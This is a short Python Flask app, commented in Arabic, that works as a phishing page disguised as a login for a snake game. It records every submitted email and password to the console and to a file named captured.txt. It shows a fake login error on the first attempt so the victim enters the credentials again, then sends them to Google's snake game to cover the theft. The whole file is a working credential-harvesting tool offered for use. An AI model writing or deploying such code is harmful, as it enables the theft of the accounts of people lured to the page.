from flask import Flask, render_template, request, redirect
import datetime

app = Flask(__name__)
tried_emails = []

@app.route('/')
def index():
    # عرض صفحة الدخول المدمجة باللعبة
    error_msg = request.args.get('error')
    return render_template('login.html', error=error_msg)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # طباعة البيانات المخطوفة في تيرمكس
    print(f"\n[!] DATA CAPTURED: {email} | {password}")
    with open("captured.txt", "a") as f:
        f.write(f"Time: {now} | Email: {email} | Pass: {password}\n")

    # المحاولة الأولى: إظهار خطأ وهمي
    if email not in tried_emails:
        tried_emails.append(email)
        return redirect("/?error=Login failed! Try again to start.")
    
    # المحاولة الثانية: التحويل للعبة الثعبان الحقيقية في جوجل
    return redirect("https://www.google.com/search?q=play+snake")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
